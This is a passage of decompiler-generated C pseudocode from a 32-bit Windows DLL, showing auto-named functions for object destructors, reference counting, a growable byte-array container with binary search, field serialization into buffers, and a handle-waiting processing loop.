    *(_DWORD *)(a1 + 32) += 4;
  if ( *(_DWORD *)(a1 + 32) + 528 >= (unsigned int)(*(int (__fastcall **)(int, int))(*(_DWORD *)a4 + 12))(a4, 8) )
  {
    v8 = sub_1000E7F7(&a2, 1, 0);
    LOBYTE(v17) = 6;
    v15 = 38;
    goto LABEL_13;
  }
  sub_1000B1F3((void *)1, (int)v16, (void *)(a1 + 28));
  LOBYTE(v17) = 7;
  if ( sub_1002E54C((_DWORD **)a1, (int)v16) )
  {
    v8 = sub_1000E7F7(&a2, 1, 0);
    LOBYTE(v17) = 8;
    v15 = 43;
LABEL_13:
    sub_10007882((int)v8);
  }
  LOBYTE(v17) = 5;
  sub_1000B3DF(v16);
  LOBYTE(v17) = 0;
  sub_1000780D(&a4);
  v17 = -1;
  sub_1000780D(&a6);
  return a1;
}
// 10103468: using guessed type int (__thiscall *off_10103468)(void *Block, char);

//----- (10030654) --------------------------------------------------------
int *__thiscall sub_10030654(int *Block, char a2)
{
  sub_10030670(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10030670) --------------------------------------------------------
void __thiscall sub_10030670(int *this)
{
  *this = (int)&off_10103468;
  sub_1000D3AD(this + 9);
  sub_1002E517(this);
}
// 10103468: using guessed type int (__thiscall *off_10103468)(void *Block, char);

//----- (100306A4) --------------------------------------------------------
int __thiscall sub_100306A4(char *this, int *Size)
{
  int v2; // edi
  LONG *v3; // esi
  int v4; // ebx
  LONG *v5; // edi
  size_t v6; // eax
  int v7; // ecx
  int v8; // ecx
  int v9; // eax
  const void *v11; // [esp-8h] [ebp-48h]
  int v12[5]; // [esp+10h] [ebp-30h] BYREF
  int v13; // [esp+24h] [ebp-1Ch]
  char *v14; // [esp+28h] [ebp-18h]
  int v15; // [esp+2Ch] [ebp-14h]
  int v16; // [esp+3Ch] [ebp-4h]
  int Sizea; // [esp+48h] [ebp+8h]

  v14 = this;
  v16 = 0;
  v2 = *Size;
  v13 = v2;
  v3 = (LONG *)(this + 36);
  v4 = v2 + 592;
  if ( !sub_1000D641((int)(this + 36), v2 + 592) )
    goto LABEL_6;
  v5 = (LONG *)(v2 + 596);
  sub_10001236(v5, v3 + 1);
  v6 = sub_1000D687(v4);
  Sizea = 2 * v6 + 2;
  sub_1000B1F3((void *)(2 * v6 + 6), (int)v12, 0);
  LOBYTE(v16) = 1;
  sub_1000B713(v7, v12, 0, 977219388);
  v11 = *(const void **)(*v5 + 12);
  v9 = sub_1000B49B(v12, v8);
  memcpy((void *)(v9 + 4), v11, Sizea);
  v15 = (*(int (__thiscall **)(char *, int *))(*(_DWORD *)v14 + 12))(v14, v12);
  if ( !v15 )
  {
    LOBYTE(v16) = 0;
    sub_1000B3DF(v12);
    v2 = v13;
LABEL_6:
    v15 = sub_1003078C(v2, (int)v14);
    v16 = -1;
    return v15;
  }
  LOBYTE(v16) = 0;
  sub_1000B3DF(v12);
  return v15;
}
// 10030714: variable 'v7' is possibly undefined
// 10030724: variable 'v8' is possibly undefined
// 100306A4: using guessed type int var_30[5];

//----- (1003078C) --------------------------------------------------------
int __userpurge sub_1003078C@<eax>(int a1@<edi>, int a2)
{
  int v2; // eax
  int v3; // ebx
  int v4; // ecx
  size_t v5; // ebx
  int v6; // ecx
  int v7; // eax
  int v8; // ecx
  int v9; // ebx
  int v10; // ebx
  int v11; // ecx
  int v12; // ecx
  int v13; // ebx
  int v14; // ecx
  int v15; // ebx
  int v16; // ecx
  int v17; // ebx
  int v18; // ecx
  int v19; // esi
  size_t v21; // [esp-4h] [ebp-38h]
  int v22[5]; // [esp+10h] [ebp-24h] BYREF
  size_t Size; // [esp+24h] [ebp-10h]
  int v24; // [esp+30h] [ebp-4h]

  v2 = lstrlenW((LPCWSTR)(a1 + 44));
  v3 = *(_DWORD *)(a2 + 32) + (*(_DWORD *)(a1 + 28) != 0 ? 8 : 0);
  Size = 2 * v2 + 2;
  sub_1000B1F3((void *)(Size + v3), (int)v22, 0);
  v24 = 0;
  sub_1000B713(v4, v22, 0, *(_DWORD *)(a1 + 616));
  v5 = Size;
  v21 = Size;
  v7 = sub_1000B49B(v22, v6);
  memcpy((void *)(v7 + 4), (const void *)(a1 + 44), v21);
  v9 = v5 + 4;
  if ( (*(_BYTE *)(a2 + 28) & 1) != 0 )
  {
    if ( *(_DWORD *)(a1 + 28) )
    {
      sub_1000B713(v8, v22, v9, -1);
      v10 = v9 + 4;
      sub_1000B713(v11, v22, v10, *(_DWORD *)(a1 + 32));
      v9 = v10 + 4;
      sub_1000B713(v12, v22, v9, *(_DWORD *)(a1 + 28));
    }
    else
    {
      sub_1000B713(v8, v22, v9, *(_DWORD *)(a1 + 32));
    }
    v9 += 4;
  }
  if ( (*(_BYTE *)(a2 + 28) & 2) != 0 )
  {
    sub_1000B713(v8, v22, v9, *(_DWORD *)(a1 + 8));
    v13 = v9 + 4;
    sub_1000B713(v14, v22, v13, *(_DWORD *)(a1 + 4));
    v9 = v13 + 4;
  }
  if ( (*(_BYTE *)(a2 + 28) & 4) != 0 )
  {
    sub_1000B713(v8, v22, v9, *(_DWORD *)(a1 + 24));
    v15 = v9 + 4;
    sub_1000B713(v16, v22, v15, *(_DWORD *)(a1 + 20));
    v9 = v15 + 4;
  }
  if ( (*(_BYTE *)(a2 + 28) & 8) != 0 )
  {
    sub_1000B713(v8, v22, v9, *(_DWORD *)(a1 + 16));
    v17 = v9 + 4;
    sub_1000B713(v18, v22, v17, *(_DWORD *)(a1 + 12));
    v9 = v17 + 4;
  }
  if ( (*(_BYTE *)(a2 + 28) & 0x10) != 0 )
    sub_1000B713(v8, v22, v9, *(_DWORD *)a1);
  v19 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)a2 + 12))(a2, v22);
  v24 = -1;
  sub_1000B3DF(v22);
  return v19;
}
// 100307D4: variable 'v4' is possibly undefined
// 100307E3: variable 'v6' is possibly undefined
// 10030809: variable 'v8' is possibly undefined
// 1003081D: variable 'v11' is possibly undefined
// 10030829: variable 'v12' is possibly undefined
// 1003084D: variable 'v14' is possibly undefined
// 10030871: variable 'v16' is possibly undefined
// 10030895: variable 'v18' is possibly undefined
// 1003078C: using guessed type int var_24[5];

//----- (100308D5) --------------------------------------------------------
char __thiscall sub_100308D5(_BYTE *this, int a2)
{
  char result; // al

  if ( !this[9] && *((_DWORD *)this + 1) == *(_DWORD *)(a2 + 616) )
    return this[8];
  result = (*(int (__thiscall **)(_BYTE *, int))(*(_DWORD *)this + 12))(this, a2);
  this[9] = 0;
  *((_DWORD *)this + 1) = *(_DWORD *)(a2 + 616);
  this[8] = result;
  return result;
}

//----- (1003090E) --------------------------------------------------------
char __thiscall sub_1003090E(int this, int a2)
{
  if ( *(_BYTE *)(this + 20) )
    return 1;
  else
    return sub_10031A0F(a2, *(_DWORD *)(this + 12));
}

//----- (10030929) --------------------------------------------------------
void __thiscall sub_10030929(_DWORD *this, int a2, volatile LONG *lpAddend)
{
  void *v4; // ecx
  _DWORD *v5; // [esp-Ch] [ebp-2Ch]
  int v6; // [esp-8h] [ebp-28h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-24h]
  void *v8; // [esp+10h] [ebp-10h]
  int v9; // [esp+1Ch] [ebp-4h]

  v9 = 0;
  (*(void (__thiscall **)(_DWORD *))(*this + 8))(this);
  v8 = &v6;
  v7 = lpAddend;
  v6 = a2;
  InterlockedIncrement(lpAddend);
  LOBYTE(v9) = 1;
  v5 = (_DWORD *)this[3];
  LOBYTE(v9) = 0;
  *((_BYTE *)this + 20) = sub_1003198C(v4, v5, v6, (int)v7);
  sub_1003098B(this + 6, &a2);
  v9 = -1;
  sub_1000780D(&a2);
}
// 10030965: variable 'v4' is possibly undefined

//----- (1003098B) --------------------------------------------------------
_DWORD *__usercall sub_1003098B@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_100081D1((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (100309B0) --------------------------------------------------------
_DWORD *__stdcall sub_100309B0(_DWORD *a1, int a2)
{
  *a1 = &off_101034B4;
  sub_1003119E(a1 + 1);
  a1[13] = -1;
  a1[10] = a2;
  return a1;
}
// 101034B4: using guessed type int (__thiscall *off_101034B4)(void *Block, char);

//----- (100309EA) --------------------------------------------------------
_DWORD *__thiscall sub_100309EA(_DWORD *Block, char a2)
{
  sub_10030A22(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10030A06) --------------------------------------------------------
_DWORD *__thiscall sub_10030A06(_DWORD *Block, char a2)
{
  sub_10031221(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10030A22) --------------------------------------------------------
void __thiscall sub_10030A22(_DWORD *this)
{
  *this = &off_101034B4;
  sub_10031221(this + 1);
}
// 101034B4: using guessed type int (__thiscall *off_101034B4)(void *Block, char);

//----- (10030A49) --------------------------------------------------------
void __stdcall sub_10030A49(int a1, int a2, int a3)
{
  int v3; // edi
  char v4; // al
  int v5; // esi
  _DWORD *v6; // eax
  char v7[9]; // [esp+13h] [ebp-Dh] BYREF
  int v8; // [esp+1Ch] [ebp-4h]

  v8 = 0;
  v3 = a2;
  v4 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 4))(a2);
  v5 = a1 + 4;
  v7[0] = v4;
  if ( !(*(unsigned __int8 (__thiscall **)(int, char *))(*(_DWORD *)(a1 + 4) + 8))(a1 + 4, v7) )
  {
    HIBYTE(a1) = (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
    v6 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v5 + 16))(v5, (char *)&a1 + 3);
    sub_1000A219(v6, &a2);
  }
  v8 = -1;
  sub_1000780D(&a2);
}
// 10030A49: using guessed type char var_D[9];

//----- (10030AAC) --------------------------------------------------------
BOOL __usercall sub_10030AAC@<eax>(int a1@<eax>)
{
  void *v1; // eax

  v1 = *(void **)(a1 + 40);
  return !v1 || WaitForSingleObjectEx(v1, 0, 1) != 258;
}

//----- (10030ACC) --------------------------------------------------------
int __thiscall sub_10030ACC(int *this)
{
  int v2; // esi
  int result; // eax
  int v4[8]; // [esp+10h] [ebp-24h] BYREF
  int v5; // [esp+30h] [ebp-4h]

  v4[4] = (int)this;
  v2 = 0;
  memset(v4, 0, 8u);
  if ( this[13] == -1 )
  {
    while ( 1 )
    {
LABEL_4:
      if ( v2 && v2 != 5 )
        return v2 != 2 ? v2 : 0;
      if ( sub_10030AAC((int)this) )
        break;
      result = (*(int (__thiscall **)(int *, int *))(*this + 4))(this, v4);
      v2 = result;
      if ( result )
        return result;
      if ( v4[0] )
      {
        v2 = sub_10030BB2((int)this, v4);
        v4[3] = v2;
        v5 = 0;
        (*(void (__thiscall **)(int *, int *, int))(*this + 12))(this, v4, v2);
        v5 = -1;
      }
    }
    return 4;
  }
  else
  {
    v2 = sub_10030BB2((int)this, this + 11);
    if ( v2 != 2 )
    {
      this[13] = -1;
      goto LABEL_4;
    }
    return 0;
  }
}
// 10182DE8: using guessed type int dword_10182DE8;

//----- (10030BB2) --------------------------------------------------------
int __userpurge sub_10030BB2@<eax>(int a1@<ebx>, int *a2)
{
  unsigned int v2; // esi
  char v3; // cl
  _DWORD **v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  _DWORD *v9; // eax
  int v10; // esi
  int v12; // [esp-4h] [ebp-38h]
  char v13; // [esp+Fh] [ebp-25h]
  int v14; // [esp+10h] [ebp-24h] BYREF
  int v15; // [esp+14h] [ebp-20h] BYREF
  unsigned int v16; // [esp+18h] [ebp-1Ch]
  int v17; // [esp+30h] [ebp-4h]

  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(a1 + 4) + 52))(a1 + 4, &v15);
  v17 = 0;
  v2 = *(_DWORD *)(a1 + 52) != -1 ? *(_DWORD *)(a1 + 52) : 0;
  v3 = 1;
  v13 = 1;
  if ( v2 >= v16 )
  {
LABEL_12:
    v10 = v3 != 0 ? 5 : 0;
    goto LABEL_16;
  }
  while ( 1 )
  {
    v4 = (_DWORD **)(*(int (__thiscall **)(int *, unsigned int))(v15 + 44))(&v15, v2);
    v5 = sub_1002E596(a2, *v4);
    if ( !v5 )
    {
      v13 = 0;
      goto LABEL_10;
    }
    v6 = v5 - 1;
    if ( !v6 )
    {
      v9 = (_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v15 + 44))(&v15, v2);
      LOBYTE(v14) = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v9 + 4))(*v9);
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)(a1 + 4) + 12))(a1 + 4, &v14);
      goto LABEL_10;
    }
    v7 = v6 - 1;
    if ( !v7 )
      break;
    v8 = v7 - 1;
    if ( !v8 )
    {
      v12 = 3;
      goto LABEL_15;
    }
    if ( v8 == 1 )
    {
      v12 = 4;
      goto LABEL_15;
    }
LABEL_10:
    if ( ++v2 >= v16 )
    {
      v3 = v13;
      goto LABEL_12;
    }
  }
  *(_DWORD *)(a1 + 52) = v2;
  v12 = 2;
LABEL_15:
  v10 = v12;
LABEL_16:
  v17 = -1;
  sub_1000A311(&v15);
  return v10;
}

//----- (10030CA7) --------------------------------------------------------
void *__thiscall sub_10030CA7(_DWORD *this, int a2)
{
  unsigned int i; // esi
  int v4; // [esp+Ch] [ebp-20h] BYREF
  unsigned int v5; // [esp+10h] [ebp-1Ch]
  int v6; // [esp+28h] [ebp-4h]

  (*(void (__thiscall **)(_DWORD *, int *))(this[1] + 52))(this + 1, &v4);
  v6 = 0;
  for ( i = 0; i < v5; ++i )
  {
    if ( *(_DWORD *)(*(_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v4 + 44))(&v4, i) + 12) )
      *(_DWORD *)(*(_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v4 + 44))(&v4, i) + 12) = a2;
  }
  v6 = -1;
  return sub_1000A311(&v4);
}

//----- (10030D3B) --------------------------------------------------------
int __thiscall sub_10030D3B(int this, int a2)
{
  sub_1000996F((void *)(this + 20), a2);
  return a2;
}

//----- (10030D6C) --------------------------------------------------------
_DWORD *__thiscall sub_10030D6C(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x1Cu);
  if ( v3 )
    v4 = sub_10030E5E(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (10030DDD) --------------------------------------------------------
_DWORD *__thiscall sub_10030DDD(void *this, _DWORD *a2, void *Block)
{
  unsigned int v4; // eax
  void *v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  v5 = Block;
  if ( (unsigned int)Block > v4 )
  {
    v6 = sub_1000E8EF(&Block);
    sub_100078FE((int)v6);
  }
  v7 = operator new(0xCu);
  Block = v7;
  if ( v7 )
  {
    v7[1] = this;
    *v7 = &off_10103A90;
    v7[2] = v5;
  }
  else
  {
    v7 = 0;
  }
  sub_10039112(a2, (int)v7);
  return a2;
}
// 10103A90: using guessed type int (__thiscall *off_10103A90)(void *Block, char);

//----- (10030E5E) --------------------------------------------------------
_DWORD *__stdcall sub_10030E5E(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_10103524;
  a1[2] = off_101034C4;
  sub_1000728E(a1 + 4, 0);
  a1[6] = 0;
  return a1;
}
// 101034C4: using guessed type int (__thiscall *off_101034C4[2])(void *Block, char);
// 10103524: using guessed type int (__stdcall *off_10103524)(char);

//----- (10030EA8) --------------------------------------------------------
int __thiscall sub_10030EA8(int this)
{
  _BYTE *v2; // eax
  _DWORD *v3; // eax
  int v5; // [esp-4h] [ebp-Ch]

  v2 = (_BYTE *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                  *(_DWORD *)(this + 4) + 4,
                  *(_DWORD *)(this + 24));
  v5 = *(_DWORD *)(this + 24);
  *(_BYTE *)(this + 12) = *v2;
  v3 = (_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
                   *(_DWORD *)(this + 4) + 20,
                   v5);
  sub_1000A219((_DWORD *)(this + 16), v3);
  return this + 8;
}

//----- (10030EDD) --------------------------------------------------------
void __thiscall sub_10030EDD(_DWORD *this)
{
  *this = off_101034C4;
  sub_1000780D(this + 2);
}
// 101034C4: using guessed type int (__thiscall *off_101034C4[2])(void *Block, char);

//----- (10030F04) --------------------------------------------------------
_DWORD *__thiscall sub_10030F04(_DWORD *Block, char a2)
{
  sub_10030EDD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10030F20) --------------------------------------------------------
_DWORD *__userpurge sub_10030F20@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  int v5; // [esp-4h] [ebp-20h]

  *a2 = off_100FBF5C;
  *a2 = &off_101034C8;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1003114F(a2, v2, v4, v5);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101034C8: using guessed type int (__thiscall *off_101034C8)(void *Block, char);

//----- (10030F6C) --------------------------------------------------------
void **__thiscall sub_10030F6C(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (10030FAB) --------------------------------------------------------
void __thiscall sub_10030FAB(int this)
{
  *(_DWORD *)this = &off_101034C8;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_10039F05((_DWORD *)this);
}
// 101034C8: using guessed type int (__thiscall *off_101034C8)(void *Block, char);

//----- (10030FFA) --------------------------------------------------------
int __thiscall sub_10030FFA(_DWORD *this, char *a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int i; // eax
  int result; // eax
  char v9; // [esp+17h] [ebp+Fh]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10137303);
  v5 = *this;
  v9 = *a2;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_BYTE *)(i + this[3]) = *(_BYTE *)(i + this[3] - 1);
  result = this[3];
  *(_BYTE *)(a3 + result) = v9;
  ++this[1];
  return result;
}

//----- (1003105C) --------------------------------------------------------
int __thiscall sub_1003105C(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013733E);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_BYTE *)(v2 + this[3]) = *(_BYTE *)(v2 + this[3] + 1);
    ++v2;
  }
  *(_BYTE *)((*(int (__thiscall **)(_DWORD *))(*this + 4))(this) + this[3]) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (100310A4) --------------------------------------------------------
int __thiscall sub_100310A4(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013733F);
  return a2 + this[3];
}

//----- (100310C0) --------------------------------------------------------
int __thiscall sub_100310C0(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013739A);
  return a2 + this[3];
}

//----- (100310DC) --------------------------------------------------------
unsigned int __thiscall sub_100310DC(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v7; // edx
  int *v8; // ecx
  unsigned int v9; // [esp+18h] [ebp+Ch]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013739B);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v9 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v9 >= a2 )
      {
        v7 = *a4;
        v8 = a4;
      }
      else
      {
        v7 = *a3;
        v8 = a3;
      }
      (*(void (__thiscall **)(int *, unsigned int))(v7 + 36))(v8, v9 + this[3]);
      ++v9;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v9 < result );
  }
  return result;
}

//----- (1003114F) --------------------------------------------------------
unsigned int __thiscall sub_1003114F(_DWORD *this, int a2, int a3, int a4)
{
  size_t v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_BYTE *)(v6 + this[3]) = *(_BYTE *)(v6 + a3);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (1003119E) --------------------------------------------------------
_DWORD *__stdcall sub_1003119E(_DWORD *a1)
{
  size_t v1; // eax
  unsigned int i; // esi

  *a1 = off_100FBF5C;
  v1 = 1;
  *a1 = &off_10103478;
  a1[1] = off_100FBF5C;
  a1[1] = &off_101034C8;
  do
    v1 *= 2;
  while ( v1 < 0x10 );
  a1[2] = 0;
  a1[3] = v1;
  a1[4] = operator new(v1);
  sub_1000A901(a1 + 5);
  a1[5] = &off_100FC208;
  for ( i = 1; i < 0x10; i *= 2 )
    ;
  sub_1000A96C(a1 + 5, i);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 100FC208: using guessed type int (__thiscall *off_100FC208)(void *Block, char);
// 10103478: using guessed type int (__thiscall *off_10103478)(void *Block, char);
// 101034C8: using guessed type int (__thiscall *off_101034C8)(void *Block, char);

//----- (10031221) --------------------------------------------------------
void __thiscall sub_10031221(_DWORD *this)
{
  *this = &off_10103478;
  sub_1000A311(this + 5);
  sub_10030FAB((int)(this + 1));
  sub_10039F05(this);
}
// 10103478: using guessed type int (__thiscall *off_10103478)(void *Block, char);

//----- (1003126C) --------------------------------------------------------
int __thiscall sub_1003126C(_DWORD *this, _BYTE *a2)
{
  int v3; // edi
  _DWORD *v4; // eax
  _DWORD v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v3 = sub_100313A7(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    (*(void (__thiscall **)(_DWORD *, _BYTE *, int))(this[1] + 32))(this + 1, a2, v3);
    v4 = sub_1000728E(v6, 0);
    v7 = 0;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[5] + 32))(this + 5, v4, v3);
    v7 = -1;
    sub_1000780D(v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 1003126C: using guessed type _DWORD var_14[4];

//----- (100312DD) --------------------------------------------------------
void __thiscall sub_100312DD(void *this, int a2, int *a3)
{
  _DWORD *v4; // eax
  int v5; // [esp+10h] [ebp-14h] BYREF
  volatile LONG *v6; // [esp+14h] [ebp-10h]
  int v7; // [esp+20h] [ebp-4h]

  v6 = (volatile LONG *)a3[1];
  v5 = *a3;
  InterlockedIncrement(v6);
  v7 = 0;
  v4 = (_DWORD *)(*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  sub_1000A219(v4, &v5);
  v7 = -1;
  sub_1000780D(&v5);
}

//----- (10031329) --------------------------------------------------------
_DWORD *__thiscall sub_10031329(_DWORD *this, _DWORD *a2)
{
  sub_10030F20(this + 1, a2);
  return a2;
}

//----- (1003135A) --------------------------------------------------------
_DWORD *__thiscall sub_1003135A(_DWORD *this, _DWORD *a2)
{
  sub_1000A23E(this + 5, a2);
  return a2;
}

//----- (1003138B) --------------------------------------------------------
void *__thiscall sub_1003138B(void *Block, char a2)
{
  sub_10030FAB((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100313A7) --------------------------------------------------------
int __userpurge sub_100313A7@<eax>(_DWORD *a1@<ebx>, _BYTE *a2)
{
  int v2; // esi
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v6 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v5 || *a2 == *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
        break;
      if ( *a2 >= *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
      {
        v6 = v2;
        v3 = v5 + v2 + 1;
      }
      else
      {
        v5 = v2;
        v3 = v2 + v6;
      }
      v2 = v3 / 2;
    }
    while ( v3 / 2 > v6 );
  }
  if ( v2 == v6 )
    return v6 + 1;
  return v2;
}

//----- (10031428) --------------------------------------------------------
char __thiscall sub_10031428(_DWORD *this, int a2)
{
  char v2; // bl
  _DWORD *v3; // eax
  void *v5[3]; // [esp+Ch] [ebp-18h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(_DWORD *, void **))(this[3] + 12))(this + 3, v5);
  v2 = 0;
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v5[0] + 12))(v5[0]);
    if ( !(*(unsigned __int8 (__thiscall **)(_DWORD, int))(*(_DWORD *)*v3 + 4))(*v3, a2) )
      goto LABEL_6;
    sub_10042AAB((int)v5[0]);
  }
  v2 = 1;
LABEL_6:
  v6 = -1;
  sub_1003406C(v5);
  return v2;
}

//----- (100314BB) --------------------------------------------------------
int __stdcall sub_100314BB(int a1, int a2, int a3, char a4, int a5, void *a6, volatile LONG *lpAddend)
{
  volatile LONG *v7; // ebx
  void *v8; // eax
  void *v10[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v11; // [esp+28h] [ebp-4h]

  v11 = 0;
  *(_DWORD *)a1 = off_10103588;
  sub_100336C2((_DWORD *)(a1 + 4));
  *(_BYTE *)(a1 + 40) = a4;
  *(_DWORD *)(a1 + 44) = &off_10103624;
  v10[2] = (void *)(a1 + 48);
  *(_DWORD *)(a1 + 48) = off_100FBF5C;
  *(_DWORD *)(a1 + 48) = &off_101036AC;
  sub_100341E9((_DWORD *)(a1 + 52));
  sub_10014563((_DWORD *)(a1 + 68));
  v7 = lpAddend;
  v10[1] = (void *)lpAddend;
  v10[0] = a6;
  InterlockedIncrement(lpAddend);
  *(_DWORD *)(a1 + 88) = 0;
  *(_DWORD *)(a1 + 84) = off_10104470;
  *(_BYTE *)(a1 + 92) = 0;
  sub_1000D372((_DWORD *)(a1 + 96), a2);
  v8 = a6;
  *(_DWORD *)(a1 + 108) = v7;
  *(_DWORD *)(a1 + 104) = v8;
  InterlockedIncrement(v7);
  sub_10050286(a1 + 84, a2, a3, 1, 0);
  LOBYTE(v11) = 7;
  sub_1003406C(v10);
  LOBYTE(v11) = 12;
  *(_DWORD *)(a1 + 112) = a5;
  sub_1003267E(a5, a1);
  v11 = -1;
  sub_1003406C(&a6);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103588: using guessed type int (__thiscall *off_10103588[2])(void *Block, char);
// 10103624: using guessed type int (__thiscall *off_10103624)(void *Block, char);
// 101036AC: using guessed type int (__thiscall *off_101036AC)(void *Block, char);
// 10104470: using guessed type int (__thiscall *off_10104470[2])(void *Block, char);

//----- (100315B8) --------------------------------------------------------
_DWORD *__thiscall sub_100315B8(_DWORD *Block, char a2)
{
  sub_100315D4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100315D4) --------------------------------------------------------
void __thiscall sub_100315D4(_DWORD *this)
{
  int v1; // ebp

  *this = off_10103588;
  sub_10031EFC(v1, this);
  sub_1005041D((int)(this + 21));
